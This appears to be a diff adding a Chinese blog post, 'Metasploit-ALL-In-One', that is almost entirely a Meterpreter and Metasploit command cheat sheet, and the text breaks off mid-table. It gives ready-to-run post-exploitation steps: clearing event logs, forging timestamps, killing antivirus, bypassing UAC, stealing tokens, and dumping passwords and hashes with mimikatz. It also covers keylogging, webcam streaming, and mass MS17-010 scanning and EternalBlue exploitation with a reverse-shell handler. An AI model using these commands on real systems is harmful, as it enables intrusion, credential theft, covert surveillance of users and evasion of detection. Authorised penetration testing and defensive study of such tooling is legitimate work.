@@ -1,0 +1,1284 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next mist" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.ico?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透测试,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="不如茶酒伴" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="Meterpreter">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit-ALL-In-One">
+<meta property="og:url" content="https://t43wiu6.github.io/2019/04/20/Metasploit-All-In-One/index.html">
+<meta property="og:site_name" content="不如茶酒伴">
+<meta property="og:description" content="Meterpreter">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://t43wiu6.github.io/2019/04/20/Metasploit-All-In-One/2.png">
+<meta property="og:updated_time" content="2019-12-25T06:22:46.861Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit-ALL-In-One">
+<meta name="twitter:description" content="Meterpreter">
+<meta name="twitter:image" content="https://t43wiu6.github.io/2019/04/20/Metasploit-All-In-One/2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://t43wiu6.github.io/2019/04/20/Metasploit-All-In-One/">
+
+
+
+
+
+  <title>Metasploit-ALL-In-One | 不如茶酒伴</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">不如茶酒伴</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大风起兮！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://t43wiu6.github.io/2019/04/20/Metasploit-All-In-One/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="t43wiu6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="不如茶酒伴">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Metasploit-ALL-In-One</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-20T05:39:32-07:00">
+                四月 20,2019
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="/2019/04/20/Metasploit-All-In-One/2.png" alt=""></p>
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><a id="more"></a>
+<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">execute <span class="comment">#在目标机中执行文件</span></span><br><span class="line">execute -H -i -f cmd.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></span><br><span class="line">clearev <span class="comment">#清除windows中的应用程序日志、系统日志、安全日志</span></span><br><span class="line">edit c:\\1.txt <span class="comment">#编辑或创建文件  没有的话，会新建文件</span></span><br><span class="line">lcd /tmp   <span class="comment">#操作攻击者主机 切换目录</span></span><br><span class="line">timestomp C:// -h   <span class="comment">#查看帮助</span></span><br><span class="line">timestomp -v C://2.txt   <span class="comment">#查看时间戳</span></span><br><span class="line">timestomp C://2.txt -f C://1.txt <span class="comment">#将1.txt的时间戳复制给2.txt</span></span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 <span class="comment">#将目标机的3389端口转发到本地6666端口</span></span><br><span class="line">portfwd delete -l 6666 -p 3389 -r 127.0.0.1 <span class="comment">#将目标机的3389端口转发到本地6666端口删除</span></span><br></pre></td></tr></table></figure>
+<h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># 自动迁移,一般是迁移到记事本</span></span><br><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 手动迁移</span></span><br><span class="line">getpid    <span class="comment"># 获取当前进程的pid</span></span><br><span class="line">ps   <span class="comment"># 查看当前活跃进程</span></span><br><span class="line">migrate &lt;pid值   <span class="comment">#将Meterpreter会话移植到指定pid值进程中</span></span><br><span class="line"><span class="built_in">kill</span> &lt;pid值  <span class="comment">#杀死进程</span></span><br></pre></td></tr></table></figure>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysinfo</span><br><span class="line">arp</span><br><span class="line">getproxy   <span class="comment">#查看代理信息</span></span><br><span class="line">idletime <span class="comment"># 查看运行时间</span></span><br><span class="line">route <span class="comment"># 查看子网</span></span><br><span class="line">getuid <span class="comment"># 查看用户名与权限</span></span><br><span class="line">run post/windows/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/windows/gather/forensics/enum_drives <span class="comment">#查看分区</span></span><br><span class="line">run post/windows/gather/enum_applications <span class="comment">#获取安装软件信息</span></span><br><span class="line">run post/windows/gather/dumplinks   <span class="comment">#获取最近的文件操作</span></span><br><span class="line">run post/windows/gather/enum_ie  <span class="comment">#获取IE缓存</span></span><br><span class="line">run post/windows/gather/enum_chrome   <span class="comment">#获取Chrome缓存</span></span><br><span class="line">run post/windows/gather/enum_patches  <span class="comment">#补丁信息</span></span><br><span class="line">run post/windows/gather/enum_domain  <span class="comment">#查找域控</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users <span class="comment"># 已登录用户列举</span></span><br><span class="line">run post/windows/manage/killav <span class="comment"># 杀死杀软</span></span><br><span class="line">run post/windows/manage/enable_rdp <span class="comment"># 启动远程桌面</span></span><br></pre></td></tr></table></figure>
+<h3 id="提权模块"><a href="#提权模块" class="headerlink" title="提权模块"></a>提权模块</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 枚举补丁</span></span><br><span class="line">background</span><br><span class="line">use post/windows/gather/enum_patches</span><br><span class="line"><span class="built_in">set</span> sessions 1</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use post/mutli/recon/local_exploit_suggester <span class="comment">#枚举提权exp</span></span><br></pre></td></tr></table></figure>
+<h4 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">backround</span><br><span class="line">use exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_comhijack</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_eventvwr</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_fodhelper</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_injection</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_sluihijack</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_vbs</span><br></pre></td></tr></table></figure>
+<h4 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h4><h5 id="令牌伪造"><a href="#令牌伪造" class="headerlink" title="令牌伪造"></a>令牌伪造</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u <span class="comment">#列出token</span></span><br><span class="line">impersonate_token WIN-57TJ4B561MT\\Administrator</span><br><span class="line">shell</span><br><span class="line">whoami</span><br><span class="line">rev2self   <span class="comment">#返回原始token</span></span><br></pre></td></tr></table></figure>
+<h5 id="窃取令牌"><a href="#窃取令牌" class="headerlink" title="窃取令牌"></a>窃取令牌</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steal_token &lt;pid值  <span class="comment">#从指定进程中窃取token   先ps</span></span><br><span class="line">drop_token  <span class="comment">#删除窃取的token</span></span><br></pre></td></tr></table></figure>
+<h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  <span class="comment">#查看补丁信息</span></span><br><span class="line">use exploit/windows/<span class="built_in">local</span>/ms10_092_schelevator</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h3 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">wdigest  <span class="comment">#获取Wdigest密码</span></span><br><span class="line">mimikatz_command -f samdump::hashes  <span class="comment">#执行mimikatz原始命令 抓取hash</span></span><br><span class="line">mimikatz_command -f samdump:: <span class="comment">#查看介绍</span></span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line">mimikatz_command -f a:: <span class="comment">#通过加载错误模块查看帮助</span></span><br><span class="line">mimikatz_command -f <span class="built_in">hash</span>:: <span class="comment">#选用该模块</span></span><br><span class="line"></span><br><span class="line">msv <span class="comment">#抓取系统hash</span></span><br><span class="line">tspkg</span><br><span class="line">kerberos <span class="comment">#抓取系统票据</span></span><br><span class="line">ssp <span class="comment">#ipc$密码</span></span><br><span class="line">wdigest <span class="comment">#获取系统账号信息</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump </span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可以导出域内所有用户hash</span></span><br><span class="line"><span class="comment">#需要SYSTEM权限</span></span><br><span class="line"><span class="comment">#如果开启了UAC会失败，需要先绕过UAC</span></span><br><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+<h3 id="屏幕抓取"><a href="#屏幕抓取" class="headerlink" title="屏幕抓取"></a>屏幕抓取</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">load espia</span><br><span class="line">screengrab</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure>
+<h3 id="摄像头抓取"><a href="#摄像头抓取" class="headerlink" title="摄像头抓取"></a>摄像头抓取</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">webcam_snap</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直播</span></span><br><span class="line">webcam_stream</span><br></pre></td></tr></table></figure>
+<h3 id="键盘操纵"><a href="#键盘操纵" class="headerlink" title="键盘操纵"></a>键盘操纵</h3><h4 id="键盘开关"><a href="#键盘开关" class="headerlink" title="键盘开关"></a>键盘开关</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uictl [<span class="built_in">enable</span>/<span class="built_in">disable</span>] [keyboard/mouse/all]  <span class="comment">#开启或禁止键盘/鼠标</span></span><br><span class="line">uictl <span class="built_in">disable</span> mouse  <span class="comment">#禁用鼠标</span></span><br><span class="line">uictl <span class="built_in">disable</span> keyboard  <span class="comment">#禁用键盘</span></span><br></pre></td></tr></table></figure>
+<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keyscan_start  <span class="comment">#开始键盘记录</span></span><br><span class="line">keyscan_dump   <span class="comment">#导出记录数据</span></span><br><span class="line">keyscan_stop <span class="comment">#结束键盘记录</span></span><br></pre></td></tr></table></figure>
+<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp USERNAME=*** PASSWORD=***</span><br><span class="line">run getgui -u example_username -p example_password <span class="comment">#不推荐</span></span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=<span class="literal">true</span> LPORT=6662  <span class="comment">#将3389端口转发到6662</span></span><br></pre></td></tr></table></figure>
+<p>开启<code>rdp</code>是通过<code>reg</code>修改注册表；添加用户是调用<code>cmd.exe</code>通过<code>net user</code>添加；端口转发是利用的<code>portfwd</code>命令</p>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">download c:\test.txt /root</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload /root/test.txt c:\</span><br></pre></td></tr></table></figure>
+<h3 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search -f *flag*</span><br><span class="line">search -f *.txt</span><br></pre></td></tr></table></figure>
+<h3 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg –h</span><br><span class="line">    -d   注册表中值的数据.</span><br><span class="line">    -k   注册表键路径</span><br><span class="line">    -v   注册表键名称</span><br><span class="line">    enumkey 枚举可获得的键</span><br><span class="line">    setval 设置键值</span><br><span class="line">    queryval 查询键值数据</span><br></pre></td></tr></table></figure>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setg</span><br><span class="line">unsetg <span class="comment">#可以配置全局变量</span></span><br></pre></td></tr></table></figure>
+<h3 id="自动路由"><a href="#自动路由" class="headerlink" title="自动路由"></a>自动路由</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run get_local_subnets <span class="comment"># 查看网段</span></span><br><span class="line">run autoroute -s ip/24 <span class="comment"># 路由子网</span></span><br><span class="line"></span><br><span class="line">run post/windows/manage/autoroute <span class="comment"># 查看并路由子网</span></span><br><span class="line">background</span><br><span class="line">route add 目标ip 掩码 session_id</span><br><span class="line">route <span class="built_in">print</span></span><br></pre></td></tr></table></figure>
+<h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks4a </span><br><span class="line"><span class="built_in">set</span> srvhost 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="msf端口扫描"><a href="#msf端口扫描" class="headerlink" title="msf端口扫描"></a>msf端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts</span><br><span class="line"><span class="built_in">set</span> ports 21-25,80-90,8080-8090,1433,3306,1521,445,139,135</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="msf-arp扫描"><a href="#msf-arp扫描" class="headerlink" title="msf_arp扫描"></a>msf_arp扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</span><br></pre></td></tr></table></figure>
+<h3 id="nmap存活扫描"><a href="#nmap存活扫描" class="headerlink" title="nmap存活扫描"></a>nmap存活扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db_nmap --min-hostgroup 1024 --min-parallelism 1024 -p 445 10.0.0.0-10.255.255.255 <span class="comment">#-sn</span></span><br></pre></td></tr></table></figure>
+<h3 id="应用扫描"><a href="#应用扫描" class="headerlink" title="应用扫描"></a>应用扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/share/metasploit-framework/modules/auxiliary/scanner/</span></span><br><span class="line">use auxiliary/scanner/http/dir_scanner</span><br><span class="line">use auxiliary/scanner/http/jboss_vulnscan</span><br><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br><span class="line">auxiliary/scanner/telnet/telnet_login <span class="comment">#TELNET登录</span></span><br><span class="line">scanner/vnc/vnc_none_auth <span class="comment">#VNC空口令扫描</span></span><br><span class="line">auxiliary/scanner/ssh/ssh_loginSSH <span class="comment">#登录测试</span></span><br><span class="line">auxiliary/scanner/portscan <span class="comment">#端口扫描</span></span><br><span class="line">---smb</span><br><span class="line">auxiliary/scanner/smb/smb_version <span class="comment">#SMB系统版本扫描</span></span><br><span class="line">auxiliary/scanner/smb/smb_enumusers <span class="comment">#SMB枚举</span></span><br><span class="line">auxiliary/scanner/smb/smb_login <span class="comment">#SMB弱口令</span></span><br><span class="line">auxiliary/scanner/smb/psexec_command <span class="comment">#SMB登录且执行命令</span></span><br><span class="line">---mssql</span><br><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">scanner/mssql/mssql_pingMSSQL <span class="comment">#主机信息扫描</span></span><br><span class="line">admin/mssql/mssql_enumMSSQL <span class="comment">#枚举</span></span><br><span class="line">admin/mssql/mssql_execMSSQL <span class="comment">#执行命令</span></span><br><span class="line">admin/mssql/mssql_sqlMSSQL <span class="comment">#查询</span></span><br><span class="line">scanner/mssql/mssql_loginMSSQL <span class="comment">#弱口令扫描</span></span><br><span class="line">---mysql</span><br><span class="line">auxiliary/scanner/mysql/mysql_version</span><br><span class="line">auxiliary/admin/mysql/mysql_enumMYSQL <span class="comment">#枚举</span></span><br><span class="line">auxiliary/admin/mysql/mysql_sqlMYSQL <span class="comment">#语句执行</span></span><br><span class="line">auxiliary/scanner/mysql/mysql_loginMYSQL <span class="comment">#弱口令扫描</span></span><br><span class="line">---smtp</span><br><span class="line">auxiliary/scanner/smtp/smtp_version <span class="comment">#SMTP版本扫描</span></span><br><span class="line">auxiliary/scanner/smtp/smtp_enum <span class="comment">#SMTP枚举</span></span><br><span class="line">auxiliary/scanner/snmp/community <span class="comment">#SNMP扫描设备</span></span><br></pre></td></tr></table></figure>
+<h3 id="扫描利用"><a href="#扫描利用" class="headerlink" title="扫描利用"></a>扫描利用</h3><h4 id="批量导入目标ip"><a href="#批量导入目标ip" class="headerlink" title="批量导入目标ip"></a>批量导入目标ip</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db_import <span class="string">"/root/445-ip.txt"</span></span><br></pre></td></tr></table></figure>
+<h4 id="扫描445"><a href="#扫描445" class="headerlink" title="扫描445"></a>扫描445</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> rhosts 10.0.0.0-10.0.255.255</span><br><span class="line"><span class="built_in">set</span> threads 400</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h4 id="扫描MS17-010"><a href="#扫描MS17-010" class="headerlink" title="扫描MS17-010"></a>扫描MS17-010</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> threads 50</span><br><span class="line"><span class="comment">#set rhosts 10.0.0.1-10.0.255.255</span></span><br><span class="line"><span class="comment">#set rhosts 192.168.1.1/24</span></span><br><span class="line">hosts -R</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h4 id="利用MS17-010"><a href="#利用MS17-010" class="headerlink" title="利用MS17-010"></a>利用MS17-010</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">hosts -R</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 本机ip</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br></pre></td></tr></table></figure>
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">     -L opt 要监听的本地主机（可选）。</span><br><span class="line">     -h        帮助横幅。</span><br><span class="line">     -l opt 要监听的本地端口。</span><br><span class="line">     -p opt 要连接的远程端口</span><br><span class="line">     -r opt 要连接的远程主机</span><br><span class="line"></span><br><span class="line">portfwd add -l 5555 -p 3389 -r 192.168.1.30</span><br></pre></td></tr></table></figure>
+<h3 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   <span class="comment">#查看网卡</span></span><br><span class="line">sniffer_start 2   <span class="comment">#选择网卡 开始抓包</span></span><br><span class="line">sniffer_stats 2   <span class="comment">#查看状态</span></span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  <span class="comment">#导出pcap数据包</span></span><br><span class="line">sniffer_stop 2   <span class="comment">#停止抓包</span></span><br></pre></td></tr></table></figure>
+<h3 id="辅助模块"><a href="#辅助模块" class="headerlink" title="辅助模块"></a>辅助模块</h3><table>
+<thead>
+<tr>
+<th style="text-align:center">模块</th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">auxiliary/scanner/portscan</td>
+<td style="text-align:center">端口扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/smb/smb_version</td>
+<td style="text-align:center">SMB系统版本扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/smb/smb_enumusers</td>
+<td style="text-align:center">SMB枚举</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/smb/smb_login</td>
+<td style="text-align:center">SMB弱口令</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/smb/psexec_command</td>
+<td style="text-align:center">SMB登录且执行命令</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/ssh/ssh_login</td>
+<td style="text-align:center">SSH登录测试</td>
+</tr>
+<tr>
+<td style="text-align:center">scanner/mssql/mssql_ping</td>
+<td style="text-align:center">MSSQL主机信息扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">admin/mssql/mssql_enum</td>
+<td style="text-align:center">MSSQL枚举</td>
+</tr>
+<tr>
+<td style="text-align:center">admin/mssql/mssql_exec</td>
+<td style="text-align:center">MSSQL执行命令</td>
+</tr>
+<tr>
+<td style="text-align:center">admin/mssql/mssql_sql</td>
+<td style="text-align:center">MSSQL查询</td>
+</tr>
+<tr>
+<td style="text-align:center">scanner/mssql/mssql_login</td>
+<td style="text-align:center">MSSQL弱口令扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/admin/mysql/mysql_enum</td>
+<td style="text-align:center">MYSQL枚举</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/admin/mysql/mysql_sql</td>
+<td style="text-align:center">MYSQL语句执行</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/mysql/mysql_login</td>
+<td style="text-align:center">MYSQL弱口令扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/smtp/smtp_version</td>
+<td style="text-align:center">SMTP版本扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/smtp/smtp_enum</td>
+<td style="text-align:center">SMTP枚举</td>
+</tr>
+<tr>
+<td style="text-align:center">auxiliary/scanner/snmp/community</td>
